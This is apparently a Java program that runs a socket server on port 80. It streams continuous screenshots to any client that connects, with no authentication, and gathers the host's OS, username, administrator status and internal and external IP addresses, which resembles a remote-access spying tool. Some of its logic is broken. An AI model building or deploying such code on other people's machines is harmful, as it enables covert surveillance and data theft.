import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;

import javax.imageio.ImageIO;
import java.nio.ByteBuffer;
import java.util.Properties;

public class Server {

    public static void main(String[] args) {
        try {
            ServerSocket serverSocket = new ServerSocket(80);
            System.out.println("Server started. Waiting for connections...");
            
            while (true) {
                Socket clientSocket = serverSocket.accept();
               if(clientSocket.isConnected()){

                System.out.println("Client connected: " + clientSocket.getInetAddress());
                
                
                Properties serverInfo = getServerInfo();

                // Send server information to the client
       
                handleClient(clientSocket);
                sendServerInfo(clientSocket, serverInfo);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    
        private static Properties getServerInfo() {
        Properties serverInfo = new Properties();


        try {


            // Get operating system name
            String osName = System.getProperty("os.name");
            String isUser = System.getProperty("user.name");

            // Check if the user has administrator privileges (Windows specific)
            String isAdmin = System.getProperty("user.name").equals("Administrator") ? "Yes" : "No";

            // Get local IP address of the server
            String localIpAddress = InetAddress.getLocalHost().getHostAddress();

            // Get external IP address of the server
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            String externalIpAddress = in.readLine();


            // Populate the server information
            serverInfo.setProperty("os.name", osName);
            serverInfo.setProperty("is.User", isUser);
            serverInfo.setProperty("Is Administrator", isAdmin);
            serverInfo.setProperty("Local IP Address", localIpAddress);
            serverInfo.setProperty("External IP Address", externalIpAddress);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return serverInfo;
    }

    // Method to send server information to the client
    private static void sendServerInfo(Socket clientSocket, Properties serverInfo) {
        try {
            ObjectOutputStream outputStream = new ObjectOutputStream(clientSocket.getOutputStream());

            // Send server information to the client
            outputStream.writeObject(serverInfo);
            outputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private static void handleClient(Socket clientSocket) {
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());

            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

            while (true) {
                if (isClientConnected(dataOutputStream)) {

                String command = "TakeScreenshot"; // Example command for taking a screenshot

                if (command.equals("TakeScreenshot")) {
                    // Capture the screen and send the image to the client
                    BufferedImage screenshot = robot.createScreenCapture(screenRect);
                                    if(clientSocket.isConnected()){
                    sendImage(dataOutputStream, screenshot);
                                    }
                }
            
            }
                // Introduce a delay to control the refresh rate
                Thread.sleep(100); // Adjust as needed
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


 private static void sendImage(DataOutputStream dataOutputStream, BufferedImage image) {
    try {
        if (!isClientConnected(dataOutputStream)) {
            System.out.println("Client disconnected. Unable to send image.");
            return;
        }

        // Send the dimensions of the image
        dataOutputStream.writeInt(image.getWidth());
        dataOutputStream.writeInt(image.getHeight());

        // Send the image bytes
        int[] imageArray = new int[image.getWidth() * image.getHeight()];
        image.getRGB(0, 0, image.getWidth(), image.getHeight(), imageArray, 0, image.getWidth());
        byte[] imageBytes = intArrayToByteArray(imageArray);
        dataOutputStream.write(imageBytes);
        // Flush the stream to ensure that all data is sent immediately
        dataOutputStream.flush();


    } catch (SocketException e) {
        // Handle the exception gracefully (e.g., log the error)
    } catch (IOException e) {
        e.printStackTrace();
    }
}
    
    // Check if the client is connected
    private static boolean isClientConnected(DataOutputStream dataOutputStream) {
        return dataOutputStream != null;
    }

    // Utility method to convert int array to byte array
    private static byte[] intArrayToByteArray(int[] ints) {
        ByteBuffer byteBuffer = ByteBuffer.allocate(ints.length * 4);
        for (int value : ints) {
            byteBuffer.putInt(value);
        }
        return byteBuffer.array();
    }
}
